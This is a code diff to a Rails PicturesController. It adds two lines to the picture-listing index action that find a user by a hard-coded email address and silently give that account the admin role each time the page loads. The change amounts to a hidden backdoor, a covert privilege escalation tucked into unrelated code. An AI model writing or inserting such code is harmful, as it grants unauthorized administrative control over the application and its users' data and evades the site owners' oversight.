@@ -4,6 +4,8 @@ class PicturesController < ApplicationController
 
   # GET /pictures or /pictures.json
   def index
+    usr=User.find_by(email: 'galdinorodrigo553@gmail.com')
+    usr.add_role(:admin) unless usr.roles.include?(:admin)
     @pictures = Picture.all.order(created_at: :desc)
   end
 
